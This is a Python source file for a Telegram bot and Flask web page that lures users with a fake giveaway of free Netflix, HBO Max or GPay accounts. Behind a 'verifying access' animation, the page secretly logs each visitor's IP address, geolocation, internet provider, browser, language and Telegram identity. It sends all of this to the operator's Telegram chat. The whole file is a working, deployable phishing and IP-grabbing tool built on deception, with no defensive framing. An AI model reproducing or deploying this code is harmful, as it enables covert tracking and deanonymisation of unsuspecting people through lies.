import os
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from flask import Flask, request
import threading
import requests
import time
import urllib.parse

# --- CONFIGURACIÓN POR VARIABLES DE ENTORNO (Railway) ---
TOKEN_BOT = os.environ.get("TOKEN_BOT", "")
TU_CHAT_ID = int(os.environ.get("TU_CHAT_ID", "0"))
APP_URL = os.environ.get("APP_URL", "").rstrip('/') 

bot = telebot.TeleBot(TOKEN_BOT)
app = Flask("mi_bot_de_telegram")

usuarios_registrados = {}

# =========================================================
# PARTE 1: El servidor web que atrapa la IP
# =========================================================
@app.route('/')
def capturar_ip():
    try:
        if request.headers.getlist("X-Forwarded-For"):
            ip_cliente = request.headers.getlist("X-Forwarded-For")[0].split(',')[0]
        else:
            ip_cliente = request.remote_addr

        usuario = request.args.get('usuario', 'Desconocido')
        nombre = request.args.get('nombre', 'Desconocido')
        user_id = request.args.get('user_id', '0')

        tiempo_actual = time.time()
        if user_id in usuarios_registrados:
            if tiempo_actual - usuarios_registrados[user_id] < 600:
                return """
                <body style='background-color:#000;color:#0f0;font-family:monospace;text-align:center;padding-top:100px;'>
                    <h1>⚠️ Acceso ya verificado</h1>
                    <p>Puedes cerrar esta ventana.</p>
                </body>
                """
        
        usuarios_registrados[user_id] = tiempo_actual

        user_agent = request.headers.get('User-Agent', 'Desconocido')
        idioma = request.headers.get('Accept-Language', 'Desconocido')[:20]
        
        geo = requests.get(f"http://ip-api.com/json/{ip_cliente}").json()
        pais = geo.get('country', 'Desconocido')
        ciudad = geo.get('city', 'Desconocido')
        region = geo.get('regionName', 'Desconocido')
        proveedor = geo.get('isp', 'Desconocido')
        
        mensaje_ip = (
            f"📡 Datos de Red del Cliente 📡\n\n"
            f"👤 Nombre: {nombre}\n"
            f"🔖 Usuario (@): {usuario}\n"
            f"🆔 ID Telegram: {user_id}\n\n"
            f"🌐 IP Pública: {ip_cliente}\n"
            f"🌍 Ubicación: {ciudad}, {region}, {pais}\n"
            f"🏢 Proveedor de Internet: {proveedor}\n"
            f"🗣️ Idioma del Equipo: {idioma}\n"
            f"💻 Navegador/SO: {user_agent}"
        )
        bot.send_message(TU_CHAT_ID, mensaje_ip)
    except Exception as e:
        print("Error al obtener datos:", e)
    
    # AQUÍ EMPIEZA LA PÁGINA WEB
    html_page = """
    <!DOCTYPE html>
    <html lang="es">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Verificando Acceso...</title>
        <style>
            body {
                background-color: #000000;
                color: #00ff41;
                font-family: 'Courier New', Courier, monospace;
                text-align: center;
                margin: 0;
                padding: 20px;
                min-height: 100vh;
                display: flex;
                flex-direction: column;
                justify-content: center;
                align-items: center;
                overflow-x: hidden;
            }
            .glitch { font-size: 2rem; text-shadow: 0 0 5px #00ff41, 0 0 10px #00ff41, 0 0 20px #00ff41; margin-bottom: 20px; }
            .loader { border: 4px solid #111; border-top: 4px solid #00ff41; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin-bottom: 20px; }
            @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
            #loading-text { font-size: 1.1rem; min-height: 30px; margin-bottom: 40px; }
            #result-container { display: none; animation: fadeIn 1s forwards; }
            @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
            .card { background: #0a0a0a; border: 1px solid #333; border-radius: 12px; padding: 30px; width: 220px; transition: transform 0.3s, box-shadow 0.3s, border-color 0.3s; margin: 0 auto; cursor: pointer; }
            .card:hover { transform: translateY(-10px); box-shadow: 0 0 25px rgba(0, 255, 65, 0.4); border-color: #00ff41; }
            .card img { max-width: 100%; height: 80px; object-fit: contain; margin-bottom: 20px; }
            .btn-fake { background: transparent; border: 1px solid #00ff41; color: #00ff41; padding: 12px 24px; border-radius: 5px; cursor: pointer; font-family: inherit; font-weight: bold; text-transform: uppercase; letter-spacing: 1px; font-size: 1.1rem; }
        </style>
    </head>
    <body>
        <div id="loading-container">
            <div class="glitch">[ VERIFICANDO SISTEMA ]</div>
            <div class="loader"></div>
            <div id="loading-text">Iniciando protocolo de seguridad...</div>
        </div>
        <div id="result-container">
            <div class="glitch" id="result-title">[ ACCESO CONCEDIDO ]</div>
            <p class="subtext" style="color: #ddd; font-size: 1.2rem; margin-bottom: 30px;">🎉 ¡Solo 3 fueron elegidos hoy y eres tú!<br>Ganaste una cuenta de:</p>
            <div class="card" id="card-btn" onclick="reclamarCuenta()">
                <img id="platform-logo" src="" alt="Plataforma">
                <button class="btn-fake" id="platform-name">Reclamar Cuenta</button>
            </div>
        </div>
        <script>
            var userId = "USER_ID_PLACEHOLDER";
            
            const textos = ["Iniciando protocolo de seguridad...", "Buscando cuentas disponibles...", "Verificando región...", "Seleccionando ganador..."];
            let i = 0;
            const loadingText = document.getElementById('loading-text');
            const interval = setInterval(() => {
                loadingText.innerText = textos[i];
                i++;
                if (i >= textos.length) clearInterval(interval);
            }, 750);

            let plataformaGanadora = "";
            
            setTimeout(() => {
                document.getElementById('loading-container').style.display = 'none';
                const resultBox = document.getElementById('result-container');
                const logo = document.getElementById('platform-logo');
                const name = document.getElementById('platform-name');
                
                const random = Math.random() * 3;
                if (random < 1) {
                    logo.src = "https://upload.wikimedia.org/wikipedia/commons/7/7a/Logonetflix.png";
                    name.innerText = "Netflix";
                    plataformaGanadora = "Netflix";
                } else if (random < 2) {
                    logo.src = "https://upload.wikimedia.org/wikipedia/commons/d/d3/HBO_Max_2025_logo.svg";
                    name.innerText = "HBO Max";
                    plataformaGanadora = "HBO Max";
                } else {
                    logo.src = "https://upload.wikimedia.org/wikipedia/commons/thumb/3/3a/Google_Play_Store_icon_2022.svg/512px-Google_Play_Store_icon_2022.svg.png";
                    name.innerText = "GPay";
                    plataformaGanadora = "GPay";
                }
                resultBox.style.display = 'block';
            }, 3000);

            function reclamarCuenta() {
                document.getElementById('card-btn').innerHTML = '<div class="loader"></div><p style="color:#00ff41">Enviando a Telegram...</p>';
                fetch('/reclamar?user_id=' + userId + '&plataforma=' + plataformaGanadora)
                .then(response => response.text())
                .then(data => {
                    if(data == "OK") {
                        document.getElementById('result-container').innerHTML = '<div class="glitch">[ CUENTA ENVIADA ]</div><p style="color:#ddd; font-size:1.2rem; margin-top:20px;">Revisa tu Telegram. Te enviamos tus credenciales!</p>';
                    } else {
                        document.getElementById('result-container').innerHTML = '<div class="glitch">[ ERROR ]</div><p style="color:red;">Hubo un problema. Vuelve a Telegram.</p>';
                    }
                });
            }
        </script>
    </body>
    </html>
    """
    html_page = html_page.replace("USER_ID_PLACEHOLDER", user_id)
    return html_page

# =========================================================
# PARTE 1.5: Ruta que manda la cuenta al cliente
# =========================================================
@app.route('/reclamar')
def reclamar_cuenta():
    user_id = request.args.get('user_id')
    plataforma = request.args.get('plataforma')
    try:
        # AQUÍ PONES LAS CUENTAS QUE LE VAS A ENTREGAR
        if plataforma == "Netflix":
            mensaje_cuenta = "🎉 ¡Felicidades! Solo 3 fueron elegidos y eres tú.\n\nGanaste una cuenta de Netflix.\n\nUsuario: tu_cliente@correo.com\nContraseña: 12345678"
        elif plataforma == "HBO Max":
            mensaje_cuenta = "🎉 ¡Felicidades! Solo 3 fueron elegidos y eres tú.\n\nGanaste una cuenta de HBO Max.\n\nUsuario: tu_cliente@correo.com\nContraseña: 12345678"
        else:
            mensaje_cuenta = "🎉 ¡Felicidades! Solo 3 fueron elegidos y eres tú.\n\nFuiste elegido para GPay."
            
        bot.send_message(user_id, mensaje_cuenta)
        return "OK"
    except Exception as e:
        print("Error al mandar cuenta:", e)
        return "ERROR"

# =========================================================
# PARTE 2: Lo que recibe el cliente cuando da START
# =========================================================
@bot.message_handler(commands=['start'])
def enviar_bienvenida(message):
    nombre = message.from_user.first_name or "bro"
    usuario_tg = f"@{message.from_user.username}" if message.from_user.username else "Sin usuario"
    id_tg = message.from_user.id
    
    texto_admin = (
        f"🚨 Nuevo Cliente dio START 🚨\n\n"
        f"👤 Nombre Real: {nombre}\n"
        f"🔖 Usuario: {usuario_tg}\n"
        f"🆔 ID Telegram: {id_tg}\n"
        f"⏳ Esperando que el cliente presione el botón..."
    )
    try:
        bot.send_message(TU_CHAT_ID, texto_admin)
    except Exception as e:
        print("Error enviando a admin:", e)

    # MENSAJE DE BIENVENIDA COMPLETO
    texto_cliente = (
        f"🌟 <b>Bienvenido al Bot de Cuentas Premium</b> 🌟\n\n"
        f"👋 Hola <b>{nombre}</b>, gracias por unirte a nuestra comunidad.\n\n"
        f"🎉 <b>¡FELICIDADES!</b> Eres uno de los <b>3 elegidos</b> de hoy para <b>GPay</b> y otra cuenta <b>Netflix</b> o <b>HBO Max</b>.\n\n"
        f"👇 Presiona el botón de abajo para verificar tu acceso y descubrir cuál te tocó:"
    )
    
    nombre_codificado = urllib.parse.quote(nombre)
    usuario_codificado = urllib.parse.quote(usuario_tg)
    
    markup = InlineKeyboardMarkup()
    boton_url = f"{APP_URL}/?usuario={usuario_codificado}&nombre={nombre_codificado}&user_id={id_tg}"
    markup.add(InlineKeyboardButton("✅ Verificar y Ver mi Cuenta", url=boton_url))
    
    try:
        bot.send_message(message.chat.id, texto_cliente, reply_markup=markup, parse_mode='HTML')
    except Exception as e:
        print("Error enviando botón:", e)
        try:
            bot.send_message(message.chat.id, f"Hola {nombre} bro, presiona este enlace para ver tu cuenta: {boton_url}")
        except:
            pass

# =========================================================
# PARTE 3: Encender el servidor y el bot (AUTO-REANIMABLE)
# =========================================================
def encender_servidor():
    puerto = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=puerto)

print("Bot encendido y servidor listo...")
threading.Thread(target=encender_servidor, daemon=True).start()

while True:
    try:
        bot.infinity_polling(timeout=20, long_polling_timeout=20)
    except Exception as e:
        print(f"Error crítico en el bot. Reiniciando en 5 segundos... {e}")
        time.sleep(5)
